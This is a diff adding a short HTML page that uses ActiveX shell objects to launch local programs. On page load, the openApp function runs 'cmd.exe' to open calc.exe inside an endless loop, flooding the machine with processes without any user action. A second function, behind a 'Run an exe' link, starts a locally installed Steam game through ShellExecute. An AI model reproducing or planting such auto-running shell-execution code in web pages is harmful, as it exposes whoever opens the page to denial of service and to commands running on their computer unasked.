@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body onload="openApp()">
+  <script type="text/javascript" language="javascript">
+    function openApp() {
+		var oShell = new ActiveXObject("wscript.shell");
+	  while(true==true)
+		oShell.Run("cmd.exe /K \"C:/Windows/System32/calc.exe\"");
+	  
+    }
+  
+  
+  var executeShell = function(){ // on click
+    var oShell = new ActiveXObject("Shell.Application");
+    var commandtoRun = "cmd /K \"C:\\Program Files (x86)\\Steam\\steamapps\\common\\PlagueInc\\PlagueIncEvolved.exe\""; 
+    oShell.ShellExecute(commandtoRun,"","","open","1");
+};
+</script>
+
+
+<a href="#execute" onclick="executeShell();return false;">Run an exe</a> 
+</body>
+</html>
